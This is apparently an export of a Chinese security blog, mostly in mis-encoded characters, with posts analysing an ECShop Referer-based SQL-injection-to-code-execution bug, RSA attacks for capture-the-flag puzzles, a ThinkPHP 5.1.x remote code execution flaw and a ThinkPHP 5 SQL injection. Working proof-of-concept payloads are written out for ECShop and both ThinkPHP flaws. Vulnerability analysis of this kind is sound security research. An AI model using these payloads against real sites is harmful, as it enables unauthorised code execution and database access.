    <content type="text"><![CDATA[‰πãÂâçÊ∏óÈÄèÊó∂ÈÅáÂà∞‰∫ÜËøôÊ†∑‰∏Ä‰∏™Á´ôÔºåÂΩìÊó∂ÁúãÂà∞Ëøô‰∏™‰∫åÊ¨°Ê≥®ÂÖ•ÂºïÂèëÁöÑÂëΩ‰ª§ÊâßË°åÁöÑËøáÁ®ãÊúâÁÇπÊÑèÊÄùÔºå‰∫éÊòØÊäΩ‰∫Ü‰∏™Êó∂Èó¥ÁÆÄÂçïÁöÑÂ§çÁé∞ÂàÜÊûê‰∫Ü‰∏Ä‰∏ã ÂâçË®Ä‰πãÂâçÊ∏óÈÄèÊó∂ÈÅáÂà∞‰∫ÜËøôÊ†∑‰∏Ä‰∏™Á´ôÔºåÂΩìÊó∂ÁúãÂà∞Ëøô‰∏™ÂëΩ‰ª§ÊâßË°åÁöÑËøáÁ®ãÊúâÁÇπ‰∏úË•øÔºå‰∫éÊòØÊäΩ‰∫Ü‰∏™Êó∂Èó¥Â§çÁé∞‰∏Ä‰∏ã ÁéØÂ¢ÉÊê≠Âª∫IDE: PHPstorm‰ª£Á†ÅÔºöECshop3.0ECShop 2.7.3 POCECshop3.0php 5.61Referer:45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:110:&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&apos; /*&quot;;&#125;&#125;45ea207d7a2b68c49582d2d22adf953a ÊºèÊ¥ûÂàÜÊûêuser.php 305Ë°åÊ∏≤ÊüìÁöÑ‰ª£Á†Å12345678910//310Ë°åif (empty($back_act) &amp;&amp; isset($GLOBALS['_SERVER']['HTTP_REFERER']))&#123; // Â¶ÇÊûúÊ≤°Êúâuser.phpÔºå Âàô$back_act‰∏∫referer $back_act = strpos($GLOBALS['_SERVER']['HTTP_REFERER'], 'user.php') ? './index.php' : $GLOBALS['_SERVER']['HTTP_REFERER'];&#125;// 330Ë°å$smarty-&gt;assign('back_act', $back_act); // Ê∏≤ÊüìrefererÂà∞Ê®°Êùø$smarty-&gt;display('user_passport.dwt'); Ë∑üËøõdisplayÂáΩÊï∞Ôºåincludes/cls_template.php12345678910111213141516// 106Ë°å$out = $this-&gt;fetch($filename, $cache_id); // fetchÊ®°ÊùøÔºåÊ∏≤ÊüìÂèòÈáèif (strpos($out, $this-&gt;_echash) !== false)&#123; $k = explode($this-&gt;_echash, $out); // _echash‰∏∫ÂÆöÂÄº foreach ($k AS $key =&gt; $val) &#123; if (($key % 2) == 1) // Â¶ÇÊûúÊòØÂ•áÊï∞‰∏™ &#123; // 45ea207d7a2b68c49582d2d22adf953aËøô‰∏™Áõ∏ÂΩì‰∫éÂàÜÂâ≤Á¨¶ÔºåÊñπ‰æø‰ªéhtmlÊèêÂèñÂá∫Â∫èÂàóÂåñÊï∞ÊçÆ $k[$key] = $this-&gt;insert_mod($val); &#125; &#125; $out = implode(&apos;&apos;, $k);&#125; Ë∑üËøõinsert_modÂáΩÊï∞Ôºåincludes/cls_template.php 1168Ë°å12345678function insert_mod($name) // Â§ÑÁêÜÂä®ÊÄÅÂÜÖÂÆπ&#123; list($fun, $para) = explode(&apos;|&apos;, $name); // |ÂâçÁöÑ‰∏∫ÂáΩÊï∞ÂêçÔºåÂêé‰∏∫ÂèÇÊï∞ $para = unserialize($para); $fun = &apos;insert_&apos; . $fun; return $fun($para); // ÂèØ‰ª•ÊâßË°åinsert_ÂºÄÂ§¥ÁöÑÂáΩÊï∞&#125; ÂèØ‰ª•ÈÄöËøáÊéßÂà∂refererÔºåÊâßË°åinsert_ÂºÄÂ§¥ÁöÑ‰ªªÊÑèÂáΩÊï∞ÔºåÊù•Áúãincludes/lib_insert.phpÔºö1234567891011121314151617181920212223242526272829// 141Ë°åfunction insert_ads($arr)&#123; static $static_res = NULL; $time = gmtime(); if (!empty($arr[&apos;num&apos;]) &amp;&amp; $arr[&apos;num&apos;] != 1) &#123; $sql = &apos;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &apos; . &apos;p.ad_height, p.position_style, RAND() AS rnd &apos; . &apos;FROM &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad&apos;) . &apos; AS a &apos;. &apos;LEFT JOIN &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad_position&apos;) . &apos; AS p ON a.position_id = p.position_id &apos; . &quot;WHERE enabled = 1 AND start_time &lt;= &apos;&quot; . $time . &quot;&apos; AND end_time &gt;= &apos;&quot; . $time . &quot;&apos; &quot;. &quot;AND a.position_id = &apos;&quot; . $arr[&apos;id&apos;] . &quot;&apos; &quot; . &apos;ORDER BY rnd LIMIT &apos; . $arr[&apos;num&apos;]; $res = $GLOBALS[&apos;db&apos;]-&gt;GetAll($sql); &#125; // arrÂèØÊéßÔºåÂΩ¢ÊàêsqlÊ≥®ÂÖ•Ôºå ÁªßÁª≠ÂæÄ‰∏ãË∑ü// 170Ë°å foreach ($res AS $row) &#123; if ($row[&apos;position_id&apos;] != $arr[&apos;id&apos;]) // Êü•Â∫ìÁöÑÁ¨¨2ÂàóÂ≠óÊÆµ &#123; continue; &#125; $position_style = $row[&apos;position_style&apos;]; // Êü•Â∫ìÁöÑÁ¨¨9Âàó $GLOBALS[&apos;smarty&apos;]-&gt;assign(&apos;ads&apos;, $ads); $val = $GLOBALS[&apos;smarty&apos;]-&gt;fetch($position_style); // ÈáçÊñ∞Â∏¶ÂÖ•Ê®°ÊùøÊ∏≤Êüì Êé•ÁùÄÔºåincludes/patch/includes_cls_template_fetch_str.php123&lt;?php$template = $this;return preg_replace_callback(&quot;/&#123;([^\&#125;\&#123;\n]*)&#125;/&quot;, function($r) use(&amp;$template)&#123;return $template-&gt;select($r[1]);&#125;, $source); Ë∞ÉselectÂáΩÊï∞Ôºåincludes/cls_template.php12//375Ë°å return &apos;&lt;?php echo &apos; . $this-&gt;get_val(substr($tag, 1)) . &apos;; ?&gt;&apos;; includes/cls_template.php get_val593Ë°å12// Â§ÑÁêÜÊéâÂèòÈáèÊ†áÁ≠æ$p = $this-&gt;make_var($val); Ë∑üËøõmake_var, includes/cls_template.php12345678910111213function make_var($val)&#123; if (strrpos($val, '.') === false) &#123; if (isset($this-&gt;_var[$val]) &amp;&amp; isset($this-&gt;_patchstack[$val])) &#123; $val = $this-&gt;_patchstack[$val]; &#125; $p = '$this-&gt;_var[\'' . $val . '\']'; &#125; // 705Ë°å return $p; ‰ª£Á†ÅÊâßË°åÔºåincludes/cls_template.php12345678910//1193Ë°åfunction _eval($content)&#123; ob_start(); eval(&apos;?&apos; . &apos;&gt;&apos; . trim($content)); $content = ob_get_contents(); ob_end_clean(); return $content;&#125;]]></content>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSAÂ∞èÁªì]]></title>
    <url>%2F2019%2F04%2F27%2FRSA%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[ÊúÄËøëÊâìÊØîËµõÈ¢ëÈ¢ëÈÅáÂà∞ÂêÑÁßçÂ≠¶ËøáÂèà‰∏ç‰ºöÁöÑÂØÜÁ†ÅÂ≠¶‚Ä¶ ÊäΩ‰∫ÜÁÇπÊó∂Èó¥Êç£Èºì‰∫Ü‰∏Ä‰∏ãÂ∏∏ËßÅrsaÊîªÂáªÊñπÊ≥ïÁöÑÂéüÁêÜÔºå‰ª•ÂêéÊúâÊó∂Èó¥ÁªßÁª≠Â°´Âùë RSAËÆ°ÁÆóËøáÁ®ãÊ∂âÂèä3‰∏™ÂèÇÊï∞Ôºö n e d, ÂÖ∂‰∏≠ {n, d}‰∏∫ÁßÅÈí•Ôºå{n, e}‰∏∫ÂÖ¨Èí• phi(n) = (p-1) * (q-1)d‰∏∫eËÜúphi(n)ÁöÑÈÄÜÂÖÉ(phi(n)‰∏∫nÁöÑÊ¨ßÊãâÂáΩÊï∞) ed ‚â° 1 (mod phi(n)) Âä†ÂØÜËß£ÂØÜËøáÁ®ãÔºöcÂØÜÊñáÔºåmÊòéÊñáÂä†ÂØÜÔºöc ‚â° m^e(mod n)Ëß£ÂØÜÔºöm ‚â° c^d(mod n) rsa‰∏≠e‰∏∫ÈöèÊú∫ÈÄâÂèñÁöÑ‰∏Ä‰∏™Êï∞Ôºå‰∏ÄËà¨‰∏∫65537nÁî±‰∏§‰∏™Â§ßÁ¥†Êï∞(p,q)‰πãÁßØÁªÑÊàêÔºåÂÖ¨Èí•{n,e}‰∏∫ÂÖ¨ÂºÄÁöÑÔºåË¶ÅÁ†¥Ëß£rsaÂ∞±ÂæóÊ±ÇÂá∫dÔºåd‰∏∫eÊ®°phi(n)ÁöÑÈÄÜÂÖÉÔºåË¶ÅÊ±ÇÂá∫phi(n)ÔºåÂøÖÈ°ªÂàÜËß£nÊ±ÇÂæóp,qÔºå‰ªéËÄåÊ±ÇÂæóphi(n)=(p-1)*(q-1) ‰ª£Á†ÅÂü∫Á°Ä powÂáΩÊï∞ÔºöpythonÂ∫ïÂ±ÇÂÆûÁé∞Âπ≥Êñπ‰πòÂíåÁÆóÊ≥ïËß£ÂØÜÔºöm ‚â° c^d(mod n)‰ΩøÁî®powÂáΩÊï∞m=pow(c,d,n) Êï∞ÊçÆÂ§ÑÁêÜÈÄöËøáÈ¢òÁõÆÁöÑÊï∞ÊçÆÊñá‰ª∂ÔºåÊâãÂ∑•Â∞ÜÂèÇÊï∞ÊèêÂèñÔºö pemÊñá‰ª∂1.1 ÁßÅÈí•Ëß£ÂØÜflagÔºöopenssl rsautl -decrypt -in flag -inkey private.pem -out flag.txt1.2 ÂÖ¨Èí•Âä†ÂØÜflagopenssl rsautl -encrypt -in FLAG -inkey public.pem -pubin -out flag.enc1.3 Ëé∑ÂèñÂÖ¨Èí•ÁöÑ‰ø°ÊÅØopenssl rsa -pubin -text -modulus -in warmup -in pubkey.pem pcapÊñá‰ª∂ PPCÊ®°Âºè CrackÁõ¥Êé•ÂàÜËß£nn &lt; 512 bit: Áõ¥Êé•ÂàÜËß£Ôºå https://factordb.comn &gt; 512 bit: ‰ΩøÁî®ÂêéÈù¢ÊñπÊ≥ï Âà©Áî®ÂÖ¨Á∫¶Êï∞È¢òÁõÆÁâπÂæÅÔºöÁõ¥Êé•ÂàÜËß£nÊó†ÊûúÂêéÔºåÂ∞ùËØïyafu„ÄÇ ‰∏§Ê¨°ÂÖ¨Èí•Âä†ÂØÜÊó∂‰ΩøÁî®ÁöÑn1Âíån2ÊúâÁõ∏ÂêåÁöÑÁ¥†Âõ†Â≠êÔºåÂàôÂèØ‰ª•Áî®Ê¨ßÂá†ÈáåÂæóÁÆóÊ≥ïÊ±ÇÂá∫n1Âíån2ÁöÑÊúÄÂ§ßÂÖ¨Âõ†Êï∞Ôºå‰πüÂ∞±ÊòØÂÖ∂‰∏≠‰∏Ä‰∏™Á¥†Âõ†Â≠ê„ÄÇ È¢òÁõÆÁâπÂæÅÔºöÁªô‰∫ÜËã•Âπ≤‰∏™nÔºåÂùá‰∏çÂêåÔºåÂπ∂‰∏înÈÉΩÊòØ2048bit„ÄÅ4096bitÁ∫ßÂà´„ÄÇ FermatÊñπÊ≥ï‰∏éPollard rhoÊñπÊ≥ïp„ÄÅqÁõ∏Â∑ÆËøáÂ§ßÊàñÁõ∏ËøëÊó∂ÔºåÂèØ‰ª•‰ΩøÁî®FermatÊñπÊ≥ï‰∏éPollard rhoÊñπÊ≥ïÂàÜËß£n„ÄÇ ÂºÄÊ∫êÈ°πÁõÆ: yafu ‰ΩéÂä†ÂØÜÊåáÊï∞ÊîªÂáªÂΩìe(e=3)ÂíåÊòéÊñáËøáÂ∞èÊó∂ÔºåÂèØ‰ª•‰ΩøÁî®ËøôÁßçÊîªÂáªÊñπÊ°àÔºö m^e&lt;nÊó∂Âä†ÂØÜÂáΩÊï∞‰∏∫Ôºöc ‚â° m^e(mod n)Ôºå Ëã•m^3&lt;nÔºå Áõ¥Êé•ÂØπÂØÜÊñácËøõË°åÂºÄ‰∏âÊ¨°ÊñπÂç≥ÂèØËß£Âá∫ÊòéÊñá„ÄÇ‰æãÈ¢òÔºö m^e&gt;nÊó∂c ‚â° m^e + k*n, ÂØπc+knËøõË°å‰∏âÊ¨°ÂºÄÊñπÔºåÂπ∂ÂØπkËøõË°åÊûö‰∏æÔºåÂç≥ÂèØÊ±ÇÂæóÊòéÊñám„ÄÇ ‰ΩéÂä†ÂØÜÊåáÊï∞ÂπøÊí≠ÊîªÂáªÈ¢òÁõÆÁâπÂæÅÔºö‰∏ÄËà¨Êù•ËØ¥ÈÉΩÊòØÁªô‰∫Ü‰∏âÁªÑÂä†ÂØÜÁöÑÂèÇÊï∞ÂíåÊòéÂØÜÊñáÔºåÂÖ∂‰∏≠È¢òÁõÆÂæàÊòéÁ°ÆÂú∞ËÉΩÂëäËØâ‰Ω†Ëøô‰∏âÁªÑÁöÑÊòéÊñáÈÉΩÊòØ‰∏ÄÊ†∑ÁöÑÔºåÂπ∂‰∏îeÈÉΩÂèñ‰∫Ü‰∏Ä‰∏™ËæÉÂ∞èÁöÑÊï∞Â≠ó„ÄÇ ÂàÜÊûêÔºöÂä†ÂØÜÊåáÊï∞eÈÄâÂèñËæÉÂ∞èÔºå‰∏î‰ΩøÁî®Áõ∏ÂêåÂä†ÂØÜÊåáÊï∞ËøõË°åÁæ§ÂèëÊ∂àÊÅØ(n‰∏çÂêå)ÔºåÂèØ‰ª•‰ΩøÁî®ÂπøÊí≠ÊîªÂáªËé∑ÂæóÊòéÊñá„ÄÇ 123c1 ‚â° m^e(mod n1)c2 ‚â° m^e(mod n2)c3 ‚â° m^e(mod n3) Âà©Áî®‰∏≠ÂõΩÂâ©‰ΩôÂÆöÁêÜÔºåËß£Âá∫m^eÔºö Áî±‰∫éeÂæàÂ∞èÔºåÊâÄ‰ª•ÂØπm^eËøõË°åÂºÄÊñπÂç≥ÂèØËß£Âá∫ ‰ΩéËß£ÂØÜÊåáÊï∞ÊîªÂáªÈ¢òÁõÆÁâπÂæÅÔºöeÁúãËµ∑Êù•ÂæàÂ§ßÂ∞±Ë°å‰∫Ü„ÄÇ d‰∏∫eÊ®°phi(n)ÁöÑÈÄÜÂÖÉÔºåeÂæàÂ§ßÈÇ£‰πàdÂ∞±Â∞è ËÑöÊú¨Ôºöhttps://github.com/pablocelayes/rsa-wiener-attack ËøôÈáåÊ≥®ÊÑè‰∏Ä‰∏™ÁªÜËäÇÈóÆÈ¢òÔºåÂ¶ÇÊûúÂú®ËøêË°åËÑöÊú¨ÁöÑÊó∂ÂÄôÊä•ÈîôÔºåËØ∑Âú®ËÑöÊú¨ÂâçÂä†‰∏äÔºöimport syssys.setrecursionlimit(10000000) ÂÖ±Ê®°ÊîªÂáªÈ¢òÁõÆÁâπÂæÅÔºöËã•Âπ≤Ê¨°Âä†ÂØÜÔºåÊØèÊ¨°nÈÉΩ‰∏ÄÊ†∑ÔºåÊòéÊñáÊ†πÊçÆÈ¢òÊÑè‰πü‰∏ÄÊ†∑Âç≥ÂèØ„ÄÇ ‰ΩøÁî®Áõ∏ÂêåÊ®°Êï∞nÂØπÁõ∏ÂêåÁöÑÂØÜÊñámËøõË°åÂä†ÂØÜ(e‰∏çÂêå)ÔºåÂèØ‰ª•‰ΩøÁî®ÂÖ±Ê®°ÊîªÂáªÊ±ÇÂá∫ÊòéÊñáÔºö12c1 ‚â° m^e1(mod n)c2 ‚â° m^e2(mod n) ÊòìÁü•: gcd(e1,e2) = 1Êúâ: s*e1 + r*e2 = 1Êé®Âá∫Ôºös*e1 + r*e2 ‚â° 1 (mod n)Áî®Êâ©Â±ïÁâàÊ¨ßÂá†ÈáåÂæóÁÆóÊ≥ïÂèØÊ±ÇÂæós„ÄÅr ÊûÑÈÄ†Ë°®ËææÂºèÔºö12c1^s ‚â° m^(e1*s)(mod n)c2^r ‚â° m^(e2*r)(mod n) ËÅîÁ´ãÔºö12c1^s * c2^r ‚â° m^[(e1*s)+(e2*r)] (mod n)c1^s * c2^r ‚â° m^1 (mod n) Ëß£Âá∫ÊòéÊñáÔºöm = (c1^s * c2^r)(mod n) ‰∏Ä‰∫õ‰æãÈ¢òjarvisoj: Medium RSAÁªô‰∫ÜÂÖ¨Èí•ÂíåÂä†ÂØÜÂêéÁöÑflagÊñá‰ª∂ÔºåÂÖàÁî®opensslÊèêÂèñÂÖ¨Èí•‰ø°ÊÅØÔºö12345678910111213$ openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem RSA Public-Key: (256 bit)Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:ddExponent: 65537 (0x10001)Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDwriting RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgMBAAE=-----END PUBLIC KEY----- ÂàÜÊûê, Áªô‰∫ÜÊàë‰ª¨mÔºå ‰πüÂ∞±ÊòØphi(n)Ôºå ÈÄöËøáÂÖ∂Ê±ÇÂá∫p,q(‚ë†)ÔºåÁÑ∂ÂêéÂ∞ÜnÊ±ÇÂá∫(‚ë°),ÈÄöËøáË°®ËææÂºè‚ë¢Â∞ÜeÁöÑÈÄÜÂÖÉdÊ±ÇÂá∫Ôºå‰ªéËÄåÂ∞ÜÂØÜÊñáËß£Âá∫(‚ë§)12345‚ë†Ôºömodulus = (p-1)(p-1)‚ë°Ôºö n = p * q‚ë¢Ôºö e*d ‚â° 1 (mod modulus)‚ë£Ôºö Âä†ÂØÜÔºöc ‚â° m^e (mod n)‚ë§Ôºö Ëß£ÂØÜÔºöm ‚â° c^d (mod n) Â∞ùËØïfactorÊó†Ëß£„ÄÇÁªßÁª≠Â∞ùËØïÁî®yafuÂàÜËß£mÔºå ‰πüÂ∞±ÊòØphi(n),ÂæóÂà∞pÂíåq12P39 = 319576316814478949870590164193048041239P39 = 275127860351348928173285174381581152299 Ê†πÊçÆe p qÁîüÊàêÁßÅÈí•Êñá‰ª∂,ËøôÈáåÁî®rsatools 1$ python3 rsatool.py -o private.pem -e 65537 -p 319576316814478949870590164193048041239 -q 275127860351348928173285174381581152299 Êé•ÁùÄÊãøÁùÄËøô‰∏™ÁßÅÈí•Áî®opensslËß£ÂØÜÔºö12$ openssl rsautl -decrypt -in flag.enc -inkey private.pem PCTF&#123;256b_i5_m3dium&#125; jarvisoj: Hard RSA12345678910111213$ openssl rsa -pubin -text -modulus -in warmup -in pubkey.pemRSA Public-Key: (256 bit)Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:ddExponent: 2 (0x2)Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDwriting RSA key-----BEGIN PUBLIC KEY-----MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgEC-----END PUBLIC KEY----- ÂæàÊòæÁÑ∂ÔºåËøôÈáåÂä†ÂØÜÊåáÊï∞e‰∏∫2ÔºåÈááÁî®‰ΩéÂä†ÂØÜÊåáÊï∞ÊîªÂáª„ÄÇ ÂèÇËÄÉÔºö jarvisoj CTF‰∏≠RSAÁöÑÂ∏∏ËßÅÊîªÂáªÊñπÊ≥ï]]></content>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ThinkPHP5.1.x ‰ª£Á†ÅÊâßË°åÊºèÊ¥ûÂàÜÊûê]]></title>
    <url>%2F2019%2F04%2F15%2FThinkPHP5.1.x%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Â§çÁé∞https://tprce/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1 ÊºèÊ¥ûÂàÜÊûê‰ªépayloadÂÖ•ÊâãÔºåÂú®appÂ§Ñ‰∏ãÊñ≠ÁÇπË∑üÂÖ•, thinkphp/library/think/Request.php 681Ë°åÔºåÂ§ÑÁêÜÂÖºÂÆπÊ®°ÂºèÁöÑurlËØ∑Ê±ÇÔºö Âú®thinkphp/library/think/route/Rule.php 947Ë°åÂèØ‰ª•ÁúãÂà∞ÂÖ∂‰ª•/ÂàÜÂâ≤ÔºåÂàÜÂâ≤ÊàêÊ®°Âùó/ÊéßÂà∂Âô®/Êìç‰ΩúÊñπÊ≥ï Ë∑ØÁî±Ëß£ÊûêÔºåÂàÜÂèëÂà∞ÂØπÂ∫îÊ®°Âùó/ÊéßÂà∂Âô®/Êìç‰ΩúÊñπÊ≥ïthinkphp/library/think/route/dispatch/Url.php 37Ë°å thinkphp/library/think/route/dispatch/Module.php 84Ë°å exec()ÔºåÂÆû‰æãÂåñÊéßÂà∂Âô® Ë∑üÂÖ•ËØ•Êñá‰ª∂135Ë°åÔºåËØ•ÂáΩÊï∞Âà©Áî®ÂèçÂ∞ÑÊú∫Âà∂Ë∞ÉÁî®Á±ªÊñπÊ≥ïÔºå‰ªéËÄåËøõË°å‰ª£Á†ÅÊâßË°å1$data = $this-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars); -&gt; thinkphp/library/think/Container.php 347Ë°å invokeFunction()Ôºö Âà∞ËøôÈáåÂ∞±Â∑≤Áªè‰ªªÊÑè‰ª£Á†ÅÊâßË°å‰∫Ü„ÄÇ Á¨¨‰∏ÄÊ¨°Êé•Ëß¶ÂèçÂ∞ÑÊú∫Âà∂ÔºåËÆ∞ÂΩï‰∏Ä‰∏ãËá™Â∑±ÁöÑÁêÜËß£ÔºåÁÆÄÂçïÊù•ËØ¥ÂèçÂ∞ÑÂç≥Ê†πÊçÆÁõÆÁöÑÂú∞ÊâæÊù•Ê∫êÔºå‰πüÂ∞±ÊòØÊ†πÊçÆÂ∑≤ÁªèÂÆû‰æãÂåñÁöÑÂØπË±°Êù•ÊâæÂÖ∂ÊâÄÂ±ûÁöÑÁ±ªÂíåÁ±ª‰∏≠ÁöÑÊñπÊ≥ï ‰ª•‰∏ä‰∏∫ThinkPHP5.1.xÁöÑrceÂàÜÊûêÔºåThinkPHP5.0.xÊúâ‰∏Ä‰∫õÂ∑ÆÂºÇÔºå‰ª•ÂêéÊù•Â°´Âùë„ÄÇ ‰øÆÂ§çË∑ØÁî±Ëß£ÊûêËøáÁ®ã‰∏≠Ê≤°ÊúâÂØπÊéßÂà∂Âô®ÁöÑÂëΩÂêçËßÑÂàôËøõË°åÊ£ÄÊµãÔºåÂØºËá¥Êàë‰ª¨ÂèØ‰ª•Êìç‰Ωú‰ªªÊÑèÊéßÂà∂Âô®ÔºåÂÆòÊñπ‰øÆÂ§çÂä†‰∫ÜÊ≠£ÂàôÂè™ÂÖÅËÆ∏Â≠óÁ¨¶‰º†ÂÖ•Ôºö ÂèÇËÄÉÔºö PHPÂèçÂ∞ÑÊú∫Âà∂ÂéüÁêÜ‰∏éÁî®Ê≥ïËØ¶Ëß£]]></content>
      <tags>
        <tag>Web</tag>
        <tag>‰ª£Á†ÅÂÆ°ËÆ°</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ThinkPHP5 SQLÊ≥®ÂÖ•ÊºèÊ¥ûÂàÜÊûê]]></title>
    <url>%2F2019%2F04%2F15%2FThinkPHP5%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[ÂèÇËÄÉÁöÑÁ∫¢Êó•ÂÆâÂÖ®Âõ¢ÈòüÁöÑÊñáÁ´†:https://github.com/Passer6y/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A51.md ÁéØÂ¢ÉÊê≠Âª∫Á¨¨‰∏ÄÊ¨°Áî®composerÂÆâË£ÖÊ∫êÁ†ÅÔºåËÆ∞ÂΩï‰∏Ä‰∏ãÈÖçÁΩÆËøáÁ®ãÔºöÁî®brewÂÆâË£ÖcomposerÔºöbrew install composerÊõ¥Êñ∞‰∏Ä‰∏ãcomposerÔºöcomposer self-updateÂÆâË£ÖÂõΩÂÜÖÈïúÂÉèÊ∫êÔºöcomposer config -g repo.packagist composer https://packagist.laravel-china.org ÂÆâË£ÖÊºèÊ¥ûÁéØÂ¢ÉÔºåthinkphp 5.0.15:composer create-project --prefer-dist topthink/think=5.0.15 tp5.0.15Â∞Ü composer.json Êñá‰ª∂ÁöÑ require Â≠óÊÆµËÆæÁΩÆÊàêÂ¶Ç‰∏ãÔºö1234&quot;require&quot;: &#123; &quot;php&quot;: &quot;&gt;=5.4.0&quot;, &quot;topthink/framework&quot;: &quot;5.0.15&quot;&#125; Â∞ÜÊï∞ÊçÆÂ∫ìÊñá‰ª∂ÔºåÊä•Èîô‰ø°ÊÅØÂºÄÂêØÂêéÔºåÂú®ÊéßÂà∂Âô®‰∏≠index.phpÂÜôÔºö123456789101112&lt;?phpnamespace app\index\controller;class Index&#123; public function index() &#123; $username = request()-&gt;get(&apos;username/a&apos;); db(&apos;users&apos;)-&gt;insert([&apos;username&apos; =&gt; $username]); return &apos;Update success&apos;; &#125;&#125; paylaod:1https://tp5.0.15/?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1 ÂàÜÊûê‰ªédemo‰ª£Á†ÅÂÖ•ÊâãÔºö123$username = request()-&gt;get(&apos;username/a&apos;); // Âº∫Âà∂Á±ªÂûãËΩ¨Êç¢ÊàêÊï∞ÁªÑdb(&apos;users&apos;)-&gt;insert([&apos;username&apos; =&gt; $username]);return &apos;Update success&apos;; ÂØπÂÖ∂Âä®ÊÄÅË∞ÉËØïËøáÁ®ã‰∏≠Ôºårequest()-&gt;get()ÔºåÂú®thinkphp/library/think/Request.php 1093Ë°åÂØπÂÖ∂Êï∞ÁªÑÁöÑÊØè‰∏™ÂèÇÊï∞ËøáÊª§Ôºö12345678public function filterExp(&amp;$value)&#123; // ËøáÊª§Êü•ËØ¢ÁâπÊÆäÂ≠óÁ¨¶ if (is_string($value) &amp;&amp; preg_match(&apos;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&apos;, $value)) &#123; $value .= &apos; &apos;; &#125; // TODO ÂÖ∂‰ªñÂÆâÂÖ®ËøáÊª§&#125; ÊòæÁÑ∂Ëøô‰∏™ËøáÊª§ËßÑÂàôÊòØÂΩ¢ÂêåËôöËÆæÁöÑ„ÄÇ ÂÜçÊù•Ë∑üÂÖ•: db(&#39;users&#39;)-&gt;insert([&#39;username&#39; =&gt; $username]);‰ªé‰∏äÈù¢payloadÂèØ‰ª•ÂèëÁé∞Êï∞ÁªÑÁöÑÁ¨¨‰∏Ä‰∏™ÂÄº‰∏∫incÔºå ÊòØtp5Êñ∞Â¢ûÁöÑÈìæÂºèÊü•ËØ¢Êìç‰Ωú:https://www.kancloud.cn/manual/thinkphp5/135178,Auto-incrementÂç≥Ëá™Âä®ÂàõÂª∫‰∏ªÈîÆÂ≠óÊÆµÂÄº„ÄÇ thinkphp/library/think/db/Builder.php 726Ë°åinsert Êï∞ÊçÆÂ§ÑÁêÜÂêéËøõË°åÊãºÊé•12345678910111213141516171819202122public function insert(array $data, $options = [], $replace = false)&#123; // ÂàÜÊûêÂπ∂Â§ÑÁêÜÊï∞ÊçÆ $data = $this-&gt;parseData($data, $options); if (empty($data)) &#123; return 0; &#125; $fields = array_keys($data); $values = array_values($data); $sql = str_replace( [&apos;%INSERT%&apos;, &apos;%TABLE%&apos;, &apos;%FIELD%&apos;, &apos;%DATA%&apos;, &apos;%COMMENT%&apos;], [ $replace ? &apos;REPLACE&apos; : &apos;INSERT&apos;, $this-&gt;parseTable($options[&apos;table&apos;], $options), implode(&apos; , &apos;, $fields), implode(&apos; , &apos;, $values), $this-&gt;parseComment($options[&apos;comment&apos;]), ], $this-&gt;insertSql); return $sql;&#125; thinkphp/library/think/db/Builder.php 118Ë°åÈÄâÊã©‰∫Ü incÊ®°Âºè ËøôÈáåÂè™ÊòØÂØπÊï∞ÊçÆËøõË°åÊ∏ÖÊ¥óÂπ∂Ê≤°ÊúâÂØπÂÖ∂ËøõË°åËøáÊª§ 123456789101112switch ($val[0]) &#123; case &apos;exp&apos;: $result[$item] = $val[1]; break; case &apos;inc&apos;: $result[$item] = $this-&gt;parseKey($val[1]) . &apos;+&apos; . floatval($val[2]); break; case &apos;dec&apos;: $result[$item] = $this-&gt;parseKey($val[1]) . &apos;-&apos; . floatval($val[2]); break;&#125;&#125; Êï∞ÊçÆÊ∏ÖÊ¥óÂÆåÂêéÔºåvalueÂÄºË¢´ÊãºÊé•ËøõÂéªÔºö Êé•ÁùÄÂú®ÂØπÂÖ∂‰∏ÄÁï™È¢ÑÂ§ÑÁêÜÂèÇÊï∞ÁªëÂÆöÂêéÂÜçËøõË°åÊü•Â∫ìÔºåthinkphp/library/think/db/Connection.php 456Ë°åÔºö 